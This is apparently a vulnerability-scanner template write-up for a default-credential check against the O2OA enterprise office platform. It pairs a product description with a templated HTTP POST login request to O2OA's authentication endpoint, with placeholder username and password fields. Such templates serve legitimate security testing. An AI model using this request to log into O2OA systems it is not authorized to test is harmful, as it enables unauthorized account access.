# Nuclei Template: O2OA - Default Login
**Template ID:** o2oa-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`o2oa-default-login.yaml`)

## Vulnerability Information & PoC

## Description
O2OA is an open source and free enterprise and team office platform. It provides four major platforms portal management, process management, information management, and data management. It integrates many functions such as work reporting, project collaboration, mobile OA, document sharing, process approval, and data collaboration. Meet various management and collaboration needs of enterprises.

## Steps to reproduce / Exploit Payload
```http
POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1
Host: {{Hostname}}
Cookie: x-token=anonymous
Authorization: anonymous
Accept: text/html,application/json,*/*
Content-Type: application/json; charset=UTF-8

{"credential":"{{username}}","password":"{{password}}"}
```

